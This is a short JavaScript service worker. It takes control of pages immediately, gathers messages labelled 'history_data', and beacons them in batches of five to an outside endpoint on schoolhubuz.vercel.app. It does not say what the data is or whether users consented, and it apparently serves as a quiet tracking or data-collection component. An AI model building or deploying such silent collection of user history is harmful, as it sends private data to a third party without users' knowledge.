let collectedData = [];

self.addEventListener('install', event => {
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    event.waitUntil(clients.claim());
});

self.addEventListener('message', event => {
    if (event.data.type === 'history_data') {
        collectedData.push(event.data.data);
        
        if (collectedData.length >= 5) {
            navigator.sendBeacon('https://schoolhubuz.vercel.app/api/collect', JSON.stringify(collectedData));
            collectedData = [];
        }
    }
});